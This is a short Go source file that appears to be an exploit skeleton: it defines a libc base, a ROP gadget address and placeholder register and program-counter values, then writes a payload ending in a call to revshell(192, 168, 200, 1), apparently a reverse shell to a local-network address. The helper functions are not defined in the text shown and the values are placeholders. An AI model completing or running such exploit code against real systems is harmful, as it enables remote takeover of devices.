package main

const (
	libc   = 0xf00
	gadget = 0xbaa
	r0     = 0x40404040
	r1     = 0x41414141
	r2     = 0x42424242
	r3     = 0x43434343
	r4     = 0x44444444
	r5     = 0x45454545
	r6     = 0x46464646
	r7     = 0x47474747
	pc     = 0x48484848
)

func main() {
	wp(0x42434445)
	ws("/_.")
	ws(revshell(192, 168, 200, 1))
}
